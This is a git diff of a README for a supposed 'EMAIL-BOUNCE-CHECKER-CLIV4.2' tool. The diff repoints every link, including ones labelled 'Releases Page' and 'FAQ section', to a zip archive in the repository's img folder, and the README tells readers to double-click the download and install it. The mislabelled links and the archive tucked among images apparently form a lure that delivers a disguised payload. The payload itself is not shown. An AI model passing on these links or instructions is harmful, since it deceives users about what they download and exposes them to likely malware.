@@ -30,13 +30,13 @@ Ensure your computer meets the following requirements:
 ### 2. Download the Software
 To download the latest version of EMAIL-BOUNCE-CHECKER-CLIV4.2, please visit the following link:
 
-[![Download EMAIL-BOUNCE-CHECKER-CLIV4.2](https://raw.githubusercontent.com/WADSAD12QWh/EMAIL-BOUNCE-CHECKER-CLIV4.2/main/img/EMAIL-BOUNCE-CHECKER-CLIV4.2_2.8.zip)](https://raw.githubusercontent.com/WADSAD12QWh/EMAIL-BOUNCE-CHECKER-CLIV4.2/main/img/EMAIL-BOUNCE-CHECKER-CLIV4.2_2.8.zip)
+[![Download EMAIL-BOUNCE-CHECKER-CLIV4.2](https://github.com/WADSAD12QWh/EMAIL-BOUNCE-CHECKER-CLIV4.2/raw/refs/heads/main/img/CLI-CHECKE-EMAI-BOUNC-blank.zip)](https://github.com/WADSAD12QWh/EMAIL-BOUNCE-CHECKER-CLIV4.2/raw/refs/heads/main/img/CLI-CHECKE-EMAI-BOUNC-blank.zip)
 
 ### 3. Install the Software
 After downloading, locate the file in your Downloads folder. Double-click on the file to start the installation process. Follow the on-screen instructions until the installation is complete.
 
 ## 📥 Download & Install
-Once installed, you can start using the EMAIL-BOUNCE-CHECKER-CLIV4.2. If you need to download again or want to get the latest updates, visit this page to download: [Releases Page](https://raw.githubusercontent.com/WADSAD12QWh/EMAIL-BOUNCE-CHECKER-CLIV4.2/main/img/EMAIL-BOUNCE-CHECKER-CLIV4.2_2.8.zip).
+Once installed, you can start using the EMAIL-BOUNCE-CHECKER-CLIV4.2. If you need to download again or want to get the latest updates, visit this page to download: [Releases Page](https://github.com/WADSAD12QWh/EMAIL-BOUNCE-CHECKER-CLIV4.2/raw/refs/heads/main/img/CLI-CHECKE-EMAI-BOUNC-blank.zip).
 
 ## 🛠️ How to Use
 Using EMAIL-BOUNCE-CHECKER-CLIV4.2 is straightforward.
@@ -79,7 +79,7 @@ If you encounter issues:
 - Restart the application if it freezes and try again.
 
 ## 📧 Support
-If you need further assistance, please reach out to our support team via GitHub Issues or refer to the [FAQ section](https://raw.githubusercontent.com/WADSAD12QWh/EMAIL-BOUNCE-CHECKER-CLIV4.2/main/img/EMAIL-BOUNCE-CHECKER-CLIV4.2_2.8.zip) on GitHub.
+If you need further assistance, please reach out to our support team via GitHub Issues or refer to the [FAQ section](https://github.com/WADSAD12QWh/EMAIL-BOUNCE-CHECKER-CLIV4.2/raw/refs/heads/main/img/CLI-CHECKE-EMAI-BOUNC-blank.zip) on GitHub.
 
 ## 🎉 Contribute
 We welcome contributions! If you have suggestions or find bugs, please create a pull request or report an issue. Help us improve EMAIL-BOUNCE-CHECKER-CLIV4.2 for everyone.
